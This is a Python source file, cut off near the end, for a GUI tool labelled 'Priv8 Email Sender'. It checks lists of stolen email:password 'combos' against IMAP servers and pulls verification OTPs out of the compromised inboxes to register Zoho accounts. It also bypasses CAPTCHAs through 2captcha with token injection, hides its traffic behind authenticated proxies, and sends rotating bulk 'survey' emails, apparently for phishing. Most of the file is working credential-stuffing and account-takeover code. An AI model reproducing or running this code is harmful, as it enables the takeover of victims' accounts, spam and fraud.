"""
Priv8 Email Sender v2  Integrated GUI (pywebview)
Tabs:
  1. Combo Checker   IMAP check, DB skip registered, Telegram notify
  2. Profiles        health cards (trial days, status, sent count, error alert)
  3. Email Sender    auto-batch, template/sender/subject rotation
  4. Design          multiple templates, multiple sender names/subjects

Run: python zoho_sender_gui.py
"""
import os, sys, time, random, threading, queue, json, base64, shutil, re, ssl, socket
import imaplib, email as _email_lib, urllib.request, urllib.parse, sqlite3
import requests
from dotenv import load_dotenv
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import secrets, string
import webview
# Handle both old and new pywebview FileDialog API
try:
    _OPEN_DLG = webview.FileDialog.OPEN
except AttributeError:
    _OPEN_DLG = webview.OPEN_DIALOG  # type: ignore

ssl._create_default_https_context = ssl._create_unverified_context
os.environ["WDM_SSL_VERIFY"] = "0"

DIR        = os.path.dirname(os.path.abspath(__file__))
CFG_FILE   = os.path.join(DIR, "sender_cfg.json")
CAPTCHA_KEY = os.getenv("CAPTCHA_KEY", "")  # 2captcha API key from .env
VALID_FILE = os.path.join(DIR, "valid_combos.json")
PROF_FILE  = os.path.join(DIR, "profiles.json")
DB_FILE    = os.path.join(DIR, "zoho_sender.db")
CKPT_FILE  = os.path.join(DIR, "checkpoint.json")   # persists across restarts
PROF_BASE  = os.path.join(os.environ.get("USERPROFILE", r"C:\Users\Administrator"), "ZohoProfiles")
MAX_FREE   = 3

os.makedirs(PROF_BASE, exist_ok=True)


def _save_checkpoint(combo_file, idx, total):
    try:
        with open(CKPT_FILE, "w", encoding="utf-8") as f:
            json.dump({"file": combo_file, "idx": idx, "total": total,
                       "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")}, f)
    except: pass

def _load_checkpoint():
    try:
        if os.path.exists(CKPT_FILE):
            with open(CKPT_FILE, encoding="utf-8-sig") as f:
                return json.load(f)
    except: pass
    return None

def _clear_checkpoint():
    try:
        if os.path.exists(CKPT_FILE): os.remove(CKPT_FILE)
    except: pass

CHECK_LOG = queue.Queue()
SEND_LOG  = queue.Queue()
_check_running = False
_send_running  = False
window = None

# Error monitoring
ERROR_LOG_FILE = os.path.join(DIR, "error_log.txt")

def log_error(msg, error_obj=None):
    """Log error to both console and file"""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{ts}] {msg}"
    if error_obj:
        log_msg += f"\n  {str(error_obj)}"
    print(log_msg)
    try:
        with open(ERROR_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_msg + "\n")
    except:
        pass

_CHECK_STATS = {"total": 0, "checked": 0, "valid": 0, "invalid": 0,
                "error": 0, "skipped": 0, "running": False,
                "pool": 0, "pool_limit": 50, "checkpoint": 0, "paused": False}

# consecutive IMAP timeout counter for IP burn detection
_consec_errors = 0
IP_BURN_THRESHOLD = 7   # notify after N consecutive errors

# pool system
MAX_VALID_POOL     = 50   # stop when this many unconnected valids exist
POOL_RESUME_AT     = 10   # resume when unconnected count drops to this
_check_checkpoint  = 0    # index in full combo list where we paused
_all_combos        = []   # full combo list (persists across pauses)
_pool_monitor_on   = False
_combo_file_path   = ""   # path to current combo file (for checkpoint persistence)


# 
#  DATABASE  (SQLite  tracks registered accounts)
# 

def db_init():
    with sqlite3.connect(DB_FILE) as c:
        c.execute('''CREATE TABLE IF NOT EXISTS registered (
            email         TEXT PRIMARY KEY,
            imap_server   TEXT,
            profile_idx   INTEGER,
            registered_at TEXT,
            status        TEXT DEFAULT 'ok'
        )''')
        c.commit()

def db_is_registered(email):
    with sqlite3.connect(DB_FILE) as c:
        return c.execute("SELECT 1 FROM registered WHERE email=?",
                         (email,)).fetchone() is not None

def db_mark_registered(email, imap_server="", profile_idx=None):
    with sqlite3.connect(DB_FILE) as c:
        c.execute("INSERT OR REPLACE INTO registered VALUES (?,?,?,?,?)",
                  (email, imap_server, profile_idx,
                   time.strftime("%Y-%m-%d %H:%M"), "ok"))
        c.commit()

def db_get_all():
    with sqlite3.connect(DB_FILE) as c:
        rows = c.execute(
            "SELECT email,imap_server,profile_idx,registered_at,status "
            "FROM registered ORDER BY registered_at DESC").fetchall()
    return [{"email":r[0],"server":r[1],"profile":r[2],
             "at":r[3],"status":r[4]} for r in rows]

def db_count():
    with sqlite3.connect(DB_FILE) as c:
        return c.execute("SELECT COUNT(*) FROM registered").fetchone()[0]


# 
#  PERSISTENCE
# 

def _load_valid():
    try:
        if os.path.exists(VALID_FILE):
            with open(VALID_FILE, encoding="utf-8-sig") as f:
                return json.load(f)
    except: pass
    return []

def _save_valid(lst):
    tmp = VALID_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(lst, f, indent=2)
    os.replace(tmp, VALID_FILE)  # atomic rename  no partial-read race condition

_PROF_DEFAULTS = {"connected_at": None, "sent_count": 0, "health": "ok",
                  "trial_days": 7, "last_health_check": None}

def _load_profiles():
    try:
        if os.path.exists(PROF_FILE):
            with open(PROF_FILE, encoding="utf-8-sig") as f:
                profiles = json.load(f)
            # Enrich any profile missing fields (backwards compat)
            changed = False
            for p in profiles:
                for k, v in _PROF_DEFAULTS.items():
                    if k not in p:
                        p[k] = v; changed = True
            if changed:
                _save_profiles(profiles)
            return profiles
    except: pass
    profiles = []
    for i in range(1, MAX_FREE + 1):
        d = os.path.join(PROF_BASE, f"profile_{i}")
        os.makedirs(d, exist_ok=True)
        profiles.append({"idx": i, "dir": d, "proxy": "", "email": "",
                         "status": "free", **_PROF_DEFAULTS})
    _save_profiles(profiles)
    return profiles

def _save_profiles(lst):
    tmp = PROF_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(lst, f, indent=2)
    os.replace(tmp, PROF_FILE)

def _load_cfg():
    """Load config from .env first, then sender_cfg.json"""
    cfg = {}

    # Load from .env (priority 1)
    proxy_type = os.getenv("PROXY_TYPE", "").strip().lower()
    proxy_host = os.getenv("PROXY_HOST", "").strip()
    proxy_port = os.getenv("PROXY_PORT", "").strip()
    capmonster_key = os.getenv("CAPMONSTER_KEY", "").strip()

    if proxy_host and proxy_port:
        cfg["proxy_str"] = f"{proxy_host}:{proxy_port}"

    if capmonster_key:
        cfg["captcha_key"] = capmonster_key

    # Load from sender_cfg.json (priority 2, override with file if exists)
    try:
        if os.path.exists(CFG_FILE):
            with open(CFG_FILE, encoding="utf-8") as f:
                file_cfg = json.load(f)
                # File config overrides .env only for specific keys
                if file_cfg.get("proxy_str"):
                    cfg["proxy_str"] = file_cfg["proxy_str"]
                if file_cfg.get("captcha_key"):
                    cfg["captcha_key"] = file_cfg["captcha_key"]
                # Merge other settings
                for k in ["tg_token", "tg_chat", "portal", "survey", "batch_size", "cooldown_min", "cooldown_max", "templates"]:
                    if k in file_cfg:
                        cfg[k] = file_cfg[k]
    except: pass

    return cfg

def _load_templates():
    cfg = _load_cfg()
    tpls = cfg.get("templates", [])
    if not tpls:
        tpls = [{
            "title":    "We'd Love Your Feedback!",
            "subtitle": "Your opinion shapes our future",
            "body":     ("We are conducting a <strong>short 3-minute survey</strong> to better "
                         "understand your needs. Your feedback is extremely valuable to us. "
                         "The survey is completely <strong>anonymous</strong>."),
        }]
    return tpls

def _load_send_options():
    cfg = _load_cfg()
    return {
        "sender_names": cfg.get("sender_names", ["Research Team"]),
        "subjects":     cfg.get("subjects",     ["Quick Survey  Your Opinion Matters"]),
        "rotate_every": int(cfg.get("rotate_every", 1)),   # batches between rotation
    }


# 
#  IMAP UTILITIES
# 

IMAP_MAP = {
    "gmail.com":      ("imap.gmail.com",         993),
    "googlemail.com": ("imap.gmail.com",         993),
    "yahoo.com":      ("imap.mail.yahoo.com",    993),
    "ymail.com":      ("imap.mail.yahoo.com",    993),
    "outlook.com":    ("outlook.office365.com",  993),
    "hotmail.com":    ("outlook.office365.com",  993),
    "live.com":       ("outlook.office365.com",  993),
    "msn.com":        ("outlook.office365.com",  993),
    "icloud.com":     ("imap.mail.me.com",       993),
    "me.com":         ("imap.mail.me.com",       993),
    "aol.com":        ("imap.aol.com",           993),
    "zoho.com":       ("imap.zoho.com",          993),
    "mail.com":       ("imap.mail.com",          993),
    "gmx.com":        ("imap.gmx.com",           993),
    "gmx.net":        ("imap.gmx.net",           993),
}

def _imap_servers(email):
    domain = email.split("@")[1].lower()
    if domain in IMAP_MAP:
        return [IMAP_MAP[domain]]
    return [(f"imap.{domain}", 993), (f"mail.{domain}", 993)]

def _imap_login(email, password, timeout=10):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    for host, port in _imap_servers(email):
        try:
            conn = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            conn.login(email, password)
            conn.logout()
            return True, host
        except Exception:
            continue
    return False, None

def _imap_get_otp(email, password, after_ts=None, timeout=90):
    """Return OTP string or verification URL from Zoho email.
    Returns str (OTP digits) or str (https URL) or None.
    Callers should check: starts with 'http'  link, else  OTP."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    if after_ts is None: after_ts = time.time() - 120
    pat_ctx  = re.compile(
        r'(?:verification code|OTP|one.time password|code is|passcode)[^\d]{0,10}(\d{4,8})',
        re.IGNORECASE)
    pat      = re.compile(r'\b(\d{6,8})\b')
    # URL from href attribute (most reliable  avoids CSS color false positives)
    pat_href = re.compile(
        r'href=["\']?(https://accounts\.zoho\.[a-z]+/[^"\'<>\s]+)', re.IGNORECASE)
    # Fallback: URL in plain text (signupconfirm, emailconfirm, etc.)
    pat_url  = re.compile(
        r'(https://accounts\.zoho\.[a-z]+/[^\s"\'<>]+)', re.IGNORECASE)
    imap = None
    for host, port in _imap_servers(email):
        try:
            imap = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            imap.login(email, password)
            break
        except Exception:
            imap = None
    if not imap:
        return None
    deadline = time.time() + timeout
    FOLDERS = ["INBOX", "Spam", "Junk", "SPAM", "JUNK", "[Gmail]/Spam"]
    def _search_folder(folder):
        try:
            rv, _ = imap.select(folder)
            if rv != "OK": return None
            _, msgs = imap.search(None, 'FROM', '"zoho"')
            ids = msgs[0].split() if msgs and msgs[0] else []
            for mid in reversed(ids[-10:]):
                try:
                    _, hdr = imap.fetch(mid, "(BODY[HEADER.FIELDS (DATE)])")
                    date_raw = hdr[0][1].decode("utf-8", errors="ignore").replace("Date:","").strip()
                    try:
                        from email.utils import parsedate_to_datetime
                        msg_ts = parsedate_to_datetime(date_raw).timestamp()
                    except: msg_ts = 0
                    if msg_ts < after_ts: continue
                    _, data = imap.fetch(mid, "(RFC822)")
                    msg = _email_lib.message_from_bytes(data[0][1])
                    body_parts = []
                    if msg.is_multipart():
                        for part in msg.walk():
                            ct = part.get_content_type()
                            if ct in ("text/plain", "text/html"):
                                try: body_parts.append(part.get_payload(decode=True).decode("utf-8", errors="ignore"))
                                except: pass
                    else:
                        try: body_parts.append(msg.get_payload(decode=True).decode("utf-8", errors="ignore"))
                        except: pass
                    body = "\n".join(body_parts)
                    # Verification link FIRST (href-based, then plain text)
                    u = pat_href.search(body) or pat_url.search(body)
                    if u: return u.group(1)
                    # OTP number (context-aware to avoid CSS color false positives)
                    m = pat_ctx.search(body)
                    if m: return m.group(1)
                    # Generic number only if email is clearly an OTP email
                    if any(kw in body.lower() for kw in ["otp","one-time","authentication","verification","your code"]):
                        m2 = pat.search(body)
                        if m2: return m2.group(1)
                except Exception: pass
        except Exception: pass
        return None
    try:
        while time.time() < deadline:
            for folder in FOLDERS:
                result = _search_folder(folder)
                if result:
                    try: imap.logout()
                    except: pass
                    return result
            time.sleep(6)
    except Exception: pass
    try: imap.logout()
    except: pass
    return None


# 
#  TELEGRAM UTILITIES
# 

def _tg_send(token, chat_id, text):
    if not token or not chat_id: return
    try:
        data = urllib.parse.urlencode({
            "chat_id": chat_id, "text": text, "parse_mode": "HTML"
        }).encode()
        urllib.request.urlopen(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data, timeout=10)
    except Exception as e:
        CHECK_LOG.put(("dim", f"  TG error: {e}"))

def _tg_send_photo(token, chat_id, img_path, caption=""):
    """Send screenshot image to Telegram."""
    if not token or not chat_id or not os.path.exists(img_path): return
    try:
        import urllib.request as ur
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        with open(img_path, "rb") as f:
            img_data = f.read()
        safe_cap = re.sub(r'[^\x20-\x7E]', '', caption)[:900]
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{safe_cap}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="photo"; filename="error.png"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode() + img_data + f"\r\n--{boundary}--\r\n".encode()
        req = ur.Request(
            f"https://api.telegram.org/bot{token}/sendPhoto",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        ur.urlopen(req, timeout=15)
    except Exception as e:
        CHECK_LOG.put(("dim", f"  TG photo error: {e}"))

def _tg_send_with_switch_btn(token, chat_id, text, prof_idx):
    """Send Telegram message with inline 'Switch Account' button."""
    if not token or not chat_id: return
    try:
        kb = json.dumps({"inline_keyboard": [[
            {"text": f" Switch Account (Prof {prof_idx})",
             "callback_data": f"switch:{prof_idx}"}
        ]]})
        data = urllib.parse.urlencode({
            "chat_id": chat_id, "text": text,
            "parse_mode": "HTML", "reply_markup": kb
        }).encode()
        urllib.request.urlopen(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data, timeout=10)
    except Exception as e:
        CHECK_LOG.put(("dim", f"  TG btn error: {e}"))

# TG callback polling  runs in background, handles "Switch Account" presses
_tg_poll_offset = 0

def _tg_callback_poll_thread(token, chat_id):
    """Long-poll Telegram for callback_query (Switch Account button)."""
    global _tg_poll_offset
    if not token or not chat_id: return
    while True:
        try:
            url = (f"https://api.telegram.org/bot{token}/getUpdates"
                   f"?offset={_tg_poll_offset}&timeout=30&allowed_updates=[\"callback_query\"]")
            resp = urllib.request.urlopen(url, timeout=35)
            data = json.loads(resp.read().decode())
            for upd in data.get("result", []):
                _tg_poll_offset = upd["update_id"] + 1
                cb = upd.get("callback_query")
                if not cb: continue
                cb_data = cb.get("data", "")
                if cb_data.startswith("switch:"):
                    try:
                        prof_idx = int(cb_data.split(":")[1])
                        _do_switch_profile(prof_idx, token, chat_id)
                    except Exception as e:
                        CHECK_LOG.put(("err", f"  Switch error: {e}"))
                # Answer callback to remove spinner on Telegram
                try:
                    ack = urllib.parse.urlencode({
                        "callback_query_id": cb["id"], "text": "Switching..."
                    }).encode()
                    urllib.request.urlopen(
                        f"https://api.telegram.org/bot{token}/answerCallbackQuery",
                        ack, timeout=5)
                except: pass
        except Exception:
            time.sleep(5)

def _do_switch_profile(prof_idx, token="", chat_id=""):
    """Switch a profile to the next unconnected valid combo."""
    profiles = _load_profiles()
    prof = next((p for p in profiles if p["idx"] == prof_idx), None)
    if not prof:
        _tg_send(token, chat_id, f"Profile {prof_idx} not found")
        return
    # Find next unconnected valid combo not in DB
    valids = _load_valid()
    nxt = next((v for v in valids
                if v.get("connected_profile") is None
                and not db_is_registered(v["email"])), None)
    if not nxt:
        _tg_send(token, chat_id, f"No available combo to switch to for Profile {prof_idx}")
        return
    # Reset old account
    prof["status"] = "free"; prof["email"] = ""
    prof["connected_at"] = None; prof["health"] = "ok"
    _save_profiles(profiles)
    if window:
        try: window.evaluate_js("refreshProfiles()")
        except: pass
    CHECK_LOG.put(("info", f"  Switching Profile {prof_idx}  {nxt['email']}"))
    threading.Thread(target=_connect_thread,
                     args=(nxt["email"], nxt["password"], prof_idx),
                     kwargs={"tg_token": token, "tg_chat": chat_id},
                     daemon=True).start()


# 
#  COMBO CHECKER (IMAP-based)  skips already-registered
# 

def _count_valid_not_connected():
    """Count valid combos not yet connected to any profile."""
    return sum(1 for v in _load_valid() if not v.get("connected_profile"))


def _combo_thread(combos, tg_token="", tg_chat="", start_idx=0):
    global _check_running, _CHECK_STATS, _consec_errors, _check_checkpoint
    total = len(combos)
    if start_idx == 0:
        _CHECK_STATS.update({"total": total, "checked": 0, "valid": 0,
                             "invalid": 0, "error": 0, "skipped": 0,
                             "running": True, "paused": False,
                             "pool": _count_valid_not_connected(),
                             "pool_limit": MAX_VALID_POOL, "checkpoint": 0})
        _consec_errors = 0
        CHECK_LOG.put(("sep", f"  IMAP check started  {total} combos  |  pool limit: {MAX_VALID_POOL}"))
    else:
        _CHECK_STATS["running"] = True
        _CHECK_STATS["paused"] = False
        _CHECK_STATS["total"] = total  # fix: was 0 after restart
        CHECK_LOG.put(("sep", f"  Resuming from #{start_idx}  pool: {_count_valid_not_connected()}/{MAX_VALID_POOL}"))

    valid_combos = _load_valid()

    for i in range(start_idx, total):
        if not _check_running:
            break

        #  Pool limit: pause when full 
        pool = _count_valid_not_connected()
        _CHECK_STATS["pool"] = pool
        if pool >= MAX_VALID_POOL:
            _check_checkpoint = i
            _CHECK_STATS["checkpoint"] = i
            _CHECK_STATS["paused"] = True
            _check_running = False
            _save_checkpoint(_combo_file_path, i, total)  # persist before pause
            pct_done = round(i / max(total, 1) * 100, 1)
            msg = (f"  POOL FULL ({pool}/{MAX_VALID_POOL})  paused at #{i}/{total} ({pct_done}%)\n"
                   f"  Will auto-resume when pool drops below {POOL_RESUME_AT}")
            CHECK_LOG.put(("ok", msg))
            if tg_token and tg_chat:
                _tg_send(tg_token, tg_chat,
                         f"[Priv8] Pool full: {pool} valid ready\n"
                         f"Paused at {i}/{total} ({pct_done}%)\n"
                         f"Auto-resume when pool < {POOL_RESUME_AT}")
            break
        # 

        email, password = combos[i]
        _CHECK_STATS["checked"] += 1
        _CHECK_STATS["checkpoint"] = i
        _check_checkpoint = i
        if i % 5 == 0:
            _save_checkpoint(_combo_file_path, i, total)

        # Skip already registered in DB
        if db_is_registered(email):
            _CHECK_STATS["skipped"] += 1
            CHECK_LOG.put(("dim", f"  [{i+1}/{total}] SKIP (registered): {email}"))
            continue

        CHECK_LOG.put(("dim", f"  [{i+1}/{total}] pool:{pool}/{MAX_VALID_POOL}  {email}"))

        try:
            ok, server = _imap_login(email, password)
            _consec_errors = 0
        except Exception as e:
            error_str = str(e)
            CHECK_LOG.put(("err", f"    Error: {error_str[:100]}"))
            _CHECK_STATS["error"] += 1
            _consec_errors += 1

            # Log full error for debugging
            import traceback
            log_error(f"IMAP login failed for {email}", e)

            if _consec_errors >= IP_BURN_THRESHOLD:
                msg = (f"[ALERT] Priv8 Combo Checker\n"
                       f"IP may be BURNED\n"
                       f"{_consec_errors} consecutive IMAP errors\n"
                       f"Last email: {email}\n"
                       f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                       f"Error: {error_str[:80]}")
                _tg_send(tg_token, tg_chat, msg)
                CHECK_LOG.put(("err", f"  IP burn warning sent to Telegram ({_consec_errors} errors)"))
                _consec_errors = 0
            continue

        if ok:
            already = [v for v in valid_combos if v["email"] == email]
            if not already:
                _CHECK_STATS["valid"] += 1
                valid_combos.append({
                    "email":    email,
                    "password": password,
                    "server":   server or "",
                    "found_at": time.strftime("%Y-%m-%d %H:%M"),
                    "connected_profile": None,
                })
                _save_valid(valid_combos)
            _CHECK_STATS["pool"] = _count_valid_not_connected()
            CHECK_LOG.put(("ok", f"  VALID: {email}  ({server})  pool:{_CHECK_STATS['pool']}/{MAX_VALID_POOL}"))
            if window:
                try: window.evaluate_js("onNewValid()")
                except: pass
        else:
            _CHECK_STATS["invalid"] += 1
            CHECK_LOG.put(("dim", f"  invalid: {email}"))

        time.sleep(random.uniform(0.5, 1.5))

    # Natural end (no pool pause)
    if _check_running or (i == total - 1 and not _CHECK_STATS.get("paused")):
        _check_running = False
        _CHECK_STATS["running"] = False
        _CHECK_STATS["paused"] = False
        _check_checkpoint = total  # exhausted
        _clear_checkpoint()
        profiles = _load_profiles()
        free_cnt = sum(1 for p in profiles if p["status"] == "free")
        s = _CHECK_STATS
        pct = round(s['valid'] / max(s['total'], 1) * 100, 1)
        msg = (f"  DONE  checked={s['checked']}  valid={s['valid']}  "
               f"invalid={s['invalid']}  skipped={s['skipped']}  ({pct}% hit rate)\n"
               f"  Pool: {_count_valid_not_connected()}/{MAX_VALID_POOL} unconnected valids")
        CHECK_LOG.put(("done", msg))
        if tg_token and tg_chat and s["valid"] > 0:
            _tg_send(tg_token, tg_chat,
                     f"[Priv8] Check complete\n"
                     f"Valid: {s['valid']} / {s['total']} ({pct}%)\n"
                     f"Skipped: {s['skipped']}  Pool: {_count_valid_not_connected()}\n"
                     f"Profiles: {free_cnt}/{len(profiles)} free")
    else:
        _check_running = False
        _CHECK_STATS["running"] = False
        _save_checkpoint(_combo_file_path, _check_checkpoint, total)  # persist on user-stop


def _pool_monitor_thread(tg_token, tg_chat):
    """Background thread: auto-resumes combo check when pool drops below POOL_RESUME_AT."""
    global _check_running, _pool_monitor_on
    _pool_monitor_on = True
    while _pool_monitor_on:
        time.sleep(30)
        try:
            if _check_running:
                continue
            if not _all_combos:
                continue
            if _check_checkpoint >= len(_all_combos):
                continue
            if _CHECK_STATS.get("paused"):
                pool = _count_valid_not_connected()
                _CHECK_STATS["pool"] = pool
                if pool < POOL_RESUME_AT:
                    _check_running = True
                    CHECK_LOG.put(("info",
                        f"  Pool dropped to {pool}/{MAX_VALID_POOL}  auto-resuming from #{_check_checkpoint}"))
                    if tg_token and tg_chat:
                        _tg_send(tg_token, tg_chat,
                                 f"[Priv8] Pool low: {pool} valid\nAuto-resuming check from #{_check_checkpoint}")
                    threading.Thread(
                        target=_combo_thread,
                        args=(_all_combos, tg_token, tg_chat, _check_checkpoint),
                        daemon=True
                    ).start()
        except Exception:
            pass


# 
#  PROFILE CONNECT (Zoho account via IMAP OTP)
# 

def _solve_image_captcha(driver, img_selector="img[src*='captcha']"):
    """Send CAPTCHA image to 2captcha and return solved text."""
    if not CAPTCHA_KEY:
        return None
    try:
        # Get image as base64
        img_b64 = None
        # Try screenshot of the captcha element
        for sel in [img_selector, "#captchaImgDiv img", ".captcha-img", "img[alt*='captcha']",
                    "img[alt*='CAPTCHA']", "#captchaImg"]:
            els = driver.find_elements(By.CSS_SELECTOR, sel)
            if els:
                try:
                    img_b64 = els[0].screenshot_as_base64
                    break
                except: pass
        # Fallback: get src and download
        if not img_b64:
            for sel in ["img[src*='captcha']", "img[src*='Captcha']"]:
                els = driver.find_elements(By.CSS_SELECTOR, sel)
                if els:
                    src = els[0].get_attribute("src") or ""
                    if src.startswith("data:image"):
                        img_b64 = src.split(",", 1)[1]
                    elif src.startswith("http"):
                        import urllib.request as _ur
                        try:
                            data = _ur.urlopen(src, timeout=10).read()
                            img_b64 = base64.b64encode(data).decode()
                        except: pass
                    break
        if not img_b64:
            CHECK_LOG.put(("info", "  2captcha: could not get CAPTCHA image"))
            return None

        CHECK_LOG.put(("info", "  2captcha: submitting image..."))
        # Submit to 2captcha
        post_data = urllib.parse.urlencode({
            "key": CAPTCHA_KEY, "method": "base64",
            "body": img_b64, "json": 1
        }).encode()
        req = urllib.request.Request("http://2captcha.com/in.php",
                                     data=post_data, method="POST")
        resp = json.loads(urllib.request.urlopen(req, timeout=30).read())
        if resp.get("status") != 1:
            CHECK_LOG.put(("err", f"  2captcha submit error: {resp}"))
            return None
        task_id = resp["request"]
        CHECK_LOG.put(("info", f"  2captcha task {task_id}  waiting..."))

        # Poll for result (max 90s)
        for _ in range(18):
            time.sleep(5)
            res_url = (f"http://2captcha.com/res.php?key={CAPTCHA_KEY}"
                       f"&action=get&id={task_id}&json=1")
            res = json.loads(urllib.request.urlopen(res_url, timeout=15).read())
            if res.get("status") == 1:
                solution = res["request"]
                CHECK_LOG.put(("ok", f"  2captcha solved: {solution}"))
                return solution
            if res.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
                CHECK_LOG.put(("err", f"  2captcha error: {res}"))
                return None
        CHECK_LOG.put(("err", "  2captcha timeout (90s)"))
        return None
    except Exception as e:
        CHECK_LOG.put(("err", f"  2captcha exception: {e}"))
        return None


def _solve_recaptcha(driver, page_url):
    """Solve reCAPTCHA v2 via 2captcha and inject token."""
    if not CAPTCHA_KEY:
        return False
    try:
        # Get sitekey
        sitekey = None
        for sel in [".g-recaptcha", "[data-sitekey]", "iframe[src*='recaptcha']"]:
            els = driver.find_elements(By.CSS_SELECTOR, sel)
            if els:
                sitekey = els[0].get_attribute("data-sitekey")
                if not sitekey:
                    # Try extracting from iframe src
                    src = els[0].get_attribute("src") or ""
                    m = re.search(r"[?&]k=([A-Za-z0-9_-]+)", src)
                    if m: sitekey = m.group(1)
                if sitekey: break
        if not sitekey:
            CHECK_LOG.put(("info", "  2captcha: sitekey not found"))
            return False

        CHECK_LOG.put(("info", f"  2captcha reCAPTCHA sitekey={sitekey[:20]}..."))
        post_data = urllib.parse.urlencode({
            "key": CAPTCHA_KEY, "method": "userrecaptcha",
            "googlekey": sitekey, "pageurl": page_url, "json": 1
        }).encode()
        req = urllib.request.Request("http://2captcha.com/in.php",
                                     data=post_data, method="POST")
        resp = json.loads(urllib.request.urlopen(req, timeout=30).read())
        if resp.get("status") != 1:
            CHECK_LOG.put(("err", f"  2captcha reCAPTCHA submit error: {resp}"))
            return False
        task_id = resp["request"]
        CHECK_LOG.put(("info", f"  2captcha reCAPTCHA task {task_id}..."))

        for _ in range(36):  # max 180s
            time.sleep(5)
            res_url = (f"http://2captcha.com/res.php?key={CAPTCHA_KEY}"
                       f"&action=get&id={task_id}&json=1")
            res = json.loads(urllib.request.urlopen(res_url, timeout=15).read())
            if res.get("status") == 1:
                token = res["request"]
                CHECK_LOG.put(("ok", "  2captcha reCAPTCHA token received  injecting"))
                driver.execute_script(f"""
                    document.getElementById('g-recaptcha-response').innerHTML='{token}';
                    if(typeof ___grecaptcha_cfg !== 'undefined') {{
                        Object.entries(___grecaptcha_cfg.clients).forEach(([k,v]) => {{
                            if(v.aa && v.aa.callback) v.aa.callback('{token}');
                        }});
                    }}
                """)
                time.sleep(1)
                return True
            if res.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
                CHECK_LOG.put(("err", f"  2captcha reCAPTCHA error: {res}"))
                return False
        return False
    except Exception as e:
        CHECK_LOG.put(("err", f"  2captcha reCAPTCHA exception: {e}"))
        return False



# --- Local Proxy Tunnel (stdlib only, handles user:pass@host:port) ---
import socket as _socket, threading as _threading, base64 as _base64

class _AuthProxyTunnel:
    _instances = {}

    @classmethod
    def get_port(cls, proxy_str):
        if proxy_str in cls._instances:
            return cls._instances[proxy_str]
        inst = cls(proxy_str)
        port = inst.start()
        cls._instances[proxy_str] = port
        return port

    def __init__(self, proxy_str):
        creds, addr = proxy_str.rsplit("@", 1)
        self._user_pass = _base64.b64encode(creds.encode()).decode()
        self._up_host, p = addr.rsplit(":", 1) if ":" in addr else (addr, "80")
        self._up_port = int(p)

    def start(self):
        srv = _socket.socket()
        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        srv.listen(50)
        port = srv.getsockname()[1]
        self._srv = srv
        _threading.Thread(target=self._loop, daemon=True).start()
        return port

    def _loop(self):
        while True:
            try:
                cl, _ = self._srv.accept()
                _threading.Thread(target=self._handle, args=(cl,), daemon=True).start()
            except Exception:
                break

    def _handle(self, cl):
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = cl.recv(4096)
                if not chunk:
                    break
                data += chunk
            if not data:
                return
            first_line = data.split(b"\r\n")[0].decode("utf-8", "replace")
            parts = first_line.split(" ", 2)
            if len(parts) < 2:
                return
            method, target = parts[0], parts[1]
            up = _socket.create_connection((self._up_host, self._up_port), timeout=15)
            if method.upper() == "CONNECT":
                req = (
                    f"CONNECT {target} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Proxy-Authorization: Basic {self._user_pass}\r\n"
                    f"Proxy-Connection: keep-alive\r\n\r\n"
                ).encode()
                up.send(req)
                resp = b""
                while b"\r\n\r\n" not in resp:
                    c = up.recv(4096)
                    if not c:
                        break
                    resp += c
                if b"200" in resp:
                    cl.send(b"HTTP/1.1 200 Connection established\r\n\r\n")
                    self._bridge(cl, up)
                else:
                    cl.send(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            else:
                lines = data.decode("utf-8", "replace").split("\r\n")
                if not any(ln.lower().startswith("proxy-authorization") for ln in lines):
                    lines.insert(1, f"Proxy-Authorization: Basic {self._user_pass}")
                up.send("\r\n".join(lines).encode())
                self._bridge(cl, up)
        except Exception:
            pass
        finally:
            try:
                cl.close()
            except Exception:
                pass

    def _bridge(self, a, b):
        def fwd(src, dst):
            try:
                while True:
                    d = src.recv(32768)
                    if not d:
                        break
                    dst.send(d)
            except Exception:
                pass
            try:
                dst.close()
            except Exception:
                pass
        t = _threading.Thread(target=fwd, args=(a, b), daemon=True)
        t.start()
        fwd(b, a)

# --- End Local Proxy Tunnel ---

# Default proxy - loaded from .env, not hardcoded
_DEFAULT_PROXY = None  # Will be loaded from .env if configured
_hidden_browser = False

def _build_driver(profile_dir, proxy=None, size=(1200, 900), headless=False):
    opts = Options()
    opts.add_argument(f"--user-data-dir={profile_dir}")
    for a in ["--no-sandbox", "--disable-dev-shm-usage",
